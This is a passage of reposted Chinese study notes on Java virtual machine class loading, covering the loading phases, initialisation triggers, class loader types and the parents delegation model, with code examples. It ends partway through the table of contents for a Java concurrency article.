个阶段。</p><h3 id="1-加载"><a href="#1-加载" class="headerlink" title="1. 加载"></a>1. 加载</h3><p>加载是类加载的一个阶段，注意不要混淆。</p><p>加载过程完成以下三件事：</p><ul><li>通过一个类的全限定名来获取定义此类的二进制字节流。</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时存储结构。</li><li>在内存中生成一个代表这个类的 Class 对象，作为方法区这个类的各种数据的访问入口。</li></ul><p>其中二进制字节流可以从以下方式中获取：</p><ul><li>从 ZIP 包读取，成为 JAR、EAR、WAR 格式的基础。</li><li>从网络中获取，最典型的应用是 Applet。</li><li>运行时计算生成，例如动态代理技术，在 java.lang.reflect.Proxy 使用 ProxyGenerator.generateProxyClass 的代理类的二进制字节流。</li><li>由其他文件生成，例如由 JSP 文件生成对应的 Class 类。</li></ul><h3 id="2-验证"><a href="#2-验证" class="headerlink" title="2. 验证"></a>2. 验证</h3><p>确保 Class 文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。</p><h3 id="3-准备"><a href="#3-准备" class="headerlink" title="3. 准备"></a>3. 准备</h3><p>类变量是被 static 修饰的变量，准备阶段为类变量分配内存并设置初始值，使用的是方法区的内存。</p><p>实例变量不会在这阶段分配内存，它将会在对象实例化时随着对象一起分配在堆中。</p><p>注意，实例化不是类加载的一个过程，类加载发生在所有实例化操作之前，并且类加载只进行一次，实例化可以进行多次。</p><p>初始值一般为 0 值，例如下面的类变量 value 被初始化为 0 而不是 123。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span></code></pre><p>如果类变量是常量，那么会按照表达式来进行初始化，而不是赋值为 0。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span></code></pre><h3 id="4-解析"><a href="#4-解析" class="headerlink" title="4. 解析"></a>4. 解析</h3><p>将常量池的符号引用替换为直接引用的过程。</p><p>其中解析过程在某些情况下可以在初始化阶段之后再开始，这是为了支持 Java 的动态绑定。</p><h3 id="5-初始化"><a href="#5-初始化" class="headerlink" title="5. 初始化"></a>5. 初始化</h3><p>初始化阶段才真正开始执行类中定义的 Java 程序代码。初始化阶段即虚拟机执行类构造器 <clinit>() 方法的过程。</clinit></p><p>在准备阶段，类变量已经赋过一次系统要求的初始值，而在初始化阶段，根据程序员通过程序制定的主观计划去初始化类变量和其它资源。</p><p><clinit>() 方法具有以下特点：</clinit></p><ul><li>是由编译器自动收集类中所有类变量的赋值动作和静态语句块中的语句合并产生的，编译器收集的顺序由语句在源文件中出现的顺序决定。特别注意的是，静态语句块只能访问到定义在它之前的类变量，定义在它之后的类变量只能赋值，不能访问。例如以下代码：</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// 给变量赋值可以正常编译通过</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 这句编译器会提示“非法向前引用”</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>与类的构造函数（或者说实例构造器 <init>()）不同，不需要显式的调用父类的构造器。虚拟机会自动保证在子类的 <clinit>() 方法运行之前，父类的 <clinit>() 方法已经执行结束。因此虚拟机中第一个执行 <clinit>() 方法的类肯定为 java.lang.Object。</clinit></clinit></clinit></init></li><li>由于父类的 <clinit>() 方法先执行，也就意味着父类中定义的静态语句块的执行要优先于子类。例如以下代码：</clinit></li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> A <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        A <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Sub</span> <span class="token keyword">extends</span> <span class="token class-name">Parent</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> B <span class="token operator">=</span> A<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>     System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Sub<span class="token punctuation">.</span>B<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 2</span><span class="token punctuation">}</span></code></pre><ul><li><clinit>() 方法对于类或接口不是必须的，如果一个类中不包含静态语句块，也没有对类变量的赋值操作，编译器可以不为该类生成 <clinit>() 方法。</clinit></clinit></li><li>接口中不可以使用静态语句块，但仍然有类变量初始化的赋值操作，因此接口与类一样都会生成 <clinit>() 方法。但接口与类不同的是，执行接口的 <clinit>() 方法不需要先执行父接口的 <clinit>() 方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的 <clinit>() 方法。</clinit></clinit></clinit></clinit></li><li>虚拟机会保证一个类的 <clinit>() 方法在多线程环境下被正确的加锁和同步，如果多个线程同时初始化一个类，只会有一个线程执行这个类的 <clinit>() 方法，其它线程都会阻塞等待，直到活动线程执行 <clinit>() 方法完毕。如果在一个类的 <clinit>() 方法中有耗时的操作，就可能造成多个线程阻塞，在实际过程中此种阻塞很隐蔽。</clinit></clinit></clinit></clinit></li></ul><h2 id="类初始化时机"><a href="#类初始化时机" class="headerlink" title="类初始化时机"></a>类初始化时机</h2><h3 id="1-主动引用"><a href="#1-主动引用" class="headerlink" title="1. 主动引用"></a>1. 主动引用</h3><p>虚拟机规范中并没有强制约束何时进行加载，但是规范严格规定了有且只有下列五种情况必须对类进行初始化（加载、验证、准备都会随之发生）：</p><ul><li>遇到 new、getstatic、putstatic、invokestatic 这四条字节码指令时，如果类没有进行过初始化，则必须先触发其初始化。最常见的生成这 4 条指令的场景是：使用 new 关键字实例化对象的时候；读取或设置一个类的静态字段（被 final 修饰、已在编译期把结果放入常量池的静态字段除外）的时候；以及调用一个类的静态方法的时候。</li><li>使用 java.lang.reflect 包的方法对类进行反射调用的时候，如果类没有进行初始化，则需要先触发其初始化。</li><li>当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。</li><li>当虚拟机启动时，用户需要指定一个要执行的主类（包含 main() 方法的那个类），虚拟机会先初始化这个主类；</li><li>当使用 JDK 1.7 的动态语言支持时，如果一个 java.lang.invoke.MethodHandle 实例最后的解析结果为 REF_getStatic, REF_putStatic, REF_invokeStatic 的方法句柄，并且这个方法句柄所对应的类没有进行过初始化，则需要先触发其初始化；</li></ul><h3 id="2-被动引用"><a href="#2-被动引用" class="headerlink" title="2. 被动引用"></a>2. 被动引用</h3><p>以上 5 种场景中的行为称为对一个类进行主动引用。除此之外，所有引用类的方式都不会触发初始化，称为被动引用。被动引用的常见例子包括：</p><ul><li>通过子类引用父类的静态字段，不会导致子类初始化。</li></ul><pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>SubClass<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// value 字段在 SuperClass 中定义</span></code></pre><ul><li>通过数组定义来引用类，不会触发此类的初始化。该过程会对数组类进行初始化，数组类是一个由虚拟机自动生成的、直接继承自 Object 的子类，其中包含了数组的属性和方法。</li></ul><pre class=" language-java"><code class="language-java">SuperClass<span class="token punctuation">[</span><span class="token punctuation">]</span> sca <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SuperClass</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><ul><li>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化。</li></ul><pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ConstClass<span class="token punctuation">.</span>HELLOWORLD<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="类与类加载器"><a href="#类与类加载器" class="headerlink" title="类与类加载器"></a>类与类加载器</h2><p>两个类相等需要类本身相等，并且使用同一个类加载器进行加载。这是因为每一个类加载器都拥有一个独立的类名称空间。</p><p>这里的相等，包括类的 Class 对象的 equals() 方法、isAssignableFrom() 方法、isInstance() 方法的返回结果为 true，也包括使用 instanceof 关键字做对象所属关系判定结果为 true。</p><h2 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h2><p>从 Java 虚拟机的角度来讲，只存在以下两种不同的类加载器：</p><ul><li>启动类加载器（Bootstrap ClassLoader），这个类加载器用 C++ 实现，是虚拟机自身的一部分；</li><li>所有其他类的加载器，这些类由 Java 实现，独立于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。</li></ul><p>从 Java 开发人员的角度看，类加载器可以划分得更细致一些：</p><ul><li>启动类加载器（Bootstrap ClassLoader）此类加载器负责将存放在 &lt;JRE_HOME&gt;\lib 目录中的，或者被 -Xbootclasspath 参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如 rt.jar，名字不符合的类库即使放在 lib 目录中也不会被加载）类库加载到虚拟机内存中。启动类加载器无法被 Java 程序直接引用，用户在编写自定义类加载器时，如果需要把加载请求委派给启动类加载器，直接使用 null 代替即可。</li><li>扩展类加载器（Extension ClassLoader）这个类加载器是由 ExtClassLoader实现的。它负责将 &lt;JAVA_HOME&gt;/lib/ext 或者被 java.ext.dir 系统变量所指定路径中的所有类库加载到内存中，开发者可以直接使用扩展类加载器。</li><li>应用程序类加载器（Application ClassLoader）这个类加载器是由 AppClassLoader实现的。由于这个类加载器是 ClassLoader 中的 getSystemClassLoader() 方法的返回值，因此一般称为系统类加载器。它负责加载用户类路径（ClassPath）上所指定的类库，开发者可以直接使用这个类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</li></ul><h2 id="双亲委派模型"><a href="#双亲委派模型" class="headerlink" title="双亲委派模型"></a>双亲委派模型</h2><p>应用程序都是由三种类加载器相互配合进行加载的，如果有必要，还可以加入自己定义的类加载器。</p><p>下图展示的类加载器之间的层次关系，称为类加载器的双亲委派模型（Parents Delegation Model）。该模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。这里类加载器之间的父子关系一般通过组合（Composition）关系来实现，而不是通过继承（Inheritance）的关系实现。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/class_loader_hierarchy.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/class_loader_hierarchy.png" alt="img"></a></p><h3 id="1-工作过程"><a href="#1-工作过程" class="headerlink" title="1. 工作过程"></a>1. 工作过程</h3><p>一个类加载器首先将类加载请求传送到父类加载器，只有当父类加载器无法完成类加载请求时才尝试加载。</p><h3 id="2-好处"><a href="#2-好处" class="headerlink" title="2. 好处"></a>2. 好处</h3><p>使得 Java 类随着它的类加载器一起具有一种带有优先级的层次关系，从而使得基础类得到统一。</p><p>例如 java.lang.Object 存放在 rt.jar 中，如果编写另外一个 java.lang.Object 的类并放到 ClassPath 中，程序可以编译通过。由于双亲委派模型的存在，所以在 rt.jar 中的 Object 比在 ClassPath 中的 Object 优先级更高，这是因为 rt.jar 中的 Object 使用的是启动类加载器，而 ClassPath 中的 Object 使用的是应用程序类加载器。rt.jar 中的 Object 优先级更高，那么程序中所有的 Object 都是这个 Object。</p><h3 id="3-实现"><a href="#3-实现" class="headerlink" title="3. 实现"></a>3. 实现</h3><p>以下是抽象类 java.lang.ClassLoader 的代码片段，其中的 loadClass() 方法运行过程如下：先检查类是否已经加载过，如果没有则让父类加载器去加载。当父类加载器加载失败时抛出 ClassNotFoundException，此时尝试自己去加载。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// The parent class loader for delegation</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> ClassLoader parent<span class="token punctuation">;</span>    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token function">getClassLoadingLock</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// First, check if the class has already been loaded</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// ClassNotFoundException thrown if class not found</span>                    <span class="token comment" spellcheck="true">// from the non-null parent class loader</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// If still not found, then invoke findClass in order</span>                    <span class="token comment" spellcheck="true">// to find the class.</span>                    c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="自定义类加载器实现"><a href="#自定义类加载器实现" class="headerlink" title="自定义类加载器实现"></a>自定义类加载器实现</h2><p>FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。</p><p>java.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，因此自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FileSystemClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String rootDir<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">FileSystemClassLoader</span><span class="token punctuation">(</span>String rootDir<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>rootDir <span class="token operator">=</span> rootDir<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classData <span class="token operator">=</span> <span class="token function">getClassData</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>classData <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> classData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classData<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getClassData</span><span class="token punctuation">(</span>String className<span class="token punctuation">)</span> <span class="token punctuation">{</span>        String path <span class="token operator">=</span> <span class="token function">classNameToPath</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            InputStream ins <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> bufferSize <span class="token operator">=</span> <span class="token number">4096</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span>bufferSize<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> bytesNumRead<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bytesNumRead <span class="token operator">=</span> ins<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesNumRead<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> String <span class="token function">classNameToPath</span><span class="token punctuation">(</span>String className<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> rootDir <span class="token operator">+</span> File<span class="token punctuation">.</span>separatorChar                <span class="token operator">+</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> File<span class="token punctuation">.</span>separatorChar<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011.</li><li><a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html#jvms-2.5.4" target="_blank" rel="noopener">Chapter 2. The Structure of the Java Virtual Machine</a></li><li><a href="https://www.slideshare.net/benewu/jvm-memory" target="_blank" rel="noopener">Jvm memory</a> <a href="http://www.oracle.com/webfolder/technetwork/tutorials/obe/java/G1GettingStarted/index.html" target="_blank" rel="noopener">Getting Started with the G1 Garbage Collector</a></li><li><a href="http://electrofriends.com/articles/jni/jni-part1-java-native-interface/" target="_blank" rel="noopener">JNI Part1: Java Native Interface Introduction and “Hello World” application</a></li><li><a href="https://hackthejava.wordpress.com/2015/01/09/memory-architecture-by-jvmruntime-data-areas/" target="_blank" rel="noopener">Memory Architecture Of JVM(Runtime Data Areas)</a></li><li><a href="https://www.programcreek.com/2013/04/jvm-run-time-data-areas/" target="_blank" rel="noopener">JVM Run-Time Data Areas</a></li><li><a href="http://www.drdobbs.com/architecture-and-design/android-on-x86-java-native-interface-and/240166271" target="_blank" rel="noopener">Android on x86: Java Native Interface and the Android Native Development Kit</a></li><li><a href="https://crowhawk.github.io/2017/08/10/jvm_2/" target="_blank" rel="noopener">深入理解 JVM(2)——GC 算法与内存分配策略</a></li><li><a href="https://crowhawk.github.io/2017/08/15/jvm_3/" target="_blank" rel="noopener">深入理解 JVM(3)——7 种垃圾收集器</a></li><li><a href="http://blog.jamesdbloom.com/JVMInternals.html" target="_blank" rel="noopener">JVM Internals</a></li><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-classloader/index.html#code6" target="_blank" rel="noopener">深入探讨 Java 类加载器</a></li><li><a href="http://www.baeldung.com/java-weakhashmap" target="_blank" rel="noopener">Guide to WeakHashMap in Java</a></li><li><a href="https://alvinalexander.com/java/jwarehouse/apache-tomcat-6.0.16/java/org/apache/el/util/ConcurrentCache.java.shtml" target="_blank" rel="noopener">Tomcat example source code file (ConcurrentCache.java)</a></li></ul><p>本文转载自: <a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java并发</title>
      <link href="/2018/12/24/java/java-bing-fa/java-bing-fa/"/>
      <url>/2018/12/24/java/java-bing-fa/java-bing-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="Java并发"><a href="#Java并发" class="headerlink" title="Java并发"></a>Java并发</h2><ul><li>一、线程状态转换<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E6%96%B0%E5%BB%BAnew">新建（New）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%8F%AF%E8%BF%90%E8%A1%8Crunnable">可运行（Runnable）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E9%98%BB%E5%A1%9Eblocking">阻塞（Blocking）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E6%97%A0%E9%99%90%E6%9C%9F%E7%AD%89%E5%BE%85waiting">无限期等待（Waiting）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E9%99%90%E6%9C%9F%E7%AD%89%E5%BE%85timed-waiting">限期等待（Timed Waiting）</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E6%AD%BB%E4%BA%A1terminated">死亡（Terminated）</a></li></ul></li><li>二、使用线程<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%AE%9E%E7%8E%B0-runnable-%E6%8E%A5%E5%8F%A3">实现 Runnable 接口</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%AE%9E%E7%8E%B0-callable-%E6%8E%A5%E5%8F%A3">实现 Callable 接口</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E7%BB%A7%E6%89%BF-thread-%E7%B1%BB">继承 Thread 类</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E5%AE%9E%E7%8E%B0%E6%8E%A5%E5%8F%A3-vs-%E7%BB%A7%E6%89%BF-thread">实现接口 VS 继承 Thread</a></li></ul></li><li>三、基础线程机制<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#executor">Executor</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#daemon">Daemon</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#sleep">sleep()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#yield">yield()</a></li></ul></li><li>四、中断<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#interruptedexception">InterruptedException</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#interrupted">interrupted()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#executor-%E7%9A%84%E4%B8%AD%E6%96%AD%E6%93%8D%E4%BD%9C">Executor 的中断操作</a></li></ul></li><li>五、互斥同步<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#synchronized">synchronized</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#reentrantlock">ReentrantLock</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E6%AF%94%E8%BE%83">比较</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#%E4%BD%BF%E7%94%A8%E9%80%89%E6%8B%A9">使用选择</a></li></ul></li><li>六、线程之间的协作<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#join">join()</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Java%20%E5%B9%B6%E5%8F%91.md#wait-notify-notifyall">wait() notify() notifyAll()</a></li><li><a 